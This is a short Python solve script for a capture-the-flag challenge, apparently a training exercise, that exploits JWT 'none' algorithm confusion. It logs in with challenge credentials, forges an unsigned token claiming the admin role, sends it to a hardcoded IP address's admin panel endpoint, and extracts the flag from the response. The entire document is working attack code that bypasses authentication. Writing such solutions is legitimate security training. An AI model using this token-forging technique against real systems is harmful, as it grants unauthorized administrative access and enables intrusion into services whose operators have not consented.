#!/usr/bin/env python3
"""
Solve script for Challenge #8: Consola API del Santuario
Exploits JWT "none" algorithm confusion to forge admin token.
"""

import sys
import requests
import jwt

URL_LOGIN = "http://192.99.247.166:8084/login"
URL_PANEL = "http://192.99.247.166:8084/panel"

def solve():
    # 1. Login to get a valid token structure (optional, we just need to know the payload format)
    resp = requests.post(URL_LOGIN, 
        json={"usuario": "capybarito", "password": "capybarito123"}, 
        timeout=10)
    
    # 2. Forge token with "none" algorithm and admin role
    forged_token = jwt.encode(
        {"user": "capybarito", "role": "admin"}, 
        "", 
        algorithm="none"
    )
    
    # 3. Access admin panel with forged token
    headers = {"Authorization": f"Bearer {forged_token}"}
    resp = requests.get(URL_PANEL, headers=headers, timeout=10)
    
    # Extract flag from JSON response
    try:
        data = resp.json()
        flag = data.get("flag")
        if flag:
            print(flag)
            return 0
    except:
        pass
    
    # Fallback: regex search
    import re
    flag_match = re.search(r'EVIL\{[^}]+\}', resp.text)
    if flag_match:
        print(flag_match.group(0))
        return 0
    
    print("Flag not found in response", file=sys.stderr)
    return 1

if __name__ == "__main__":
    sys.exit(solve())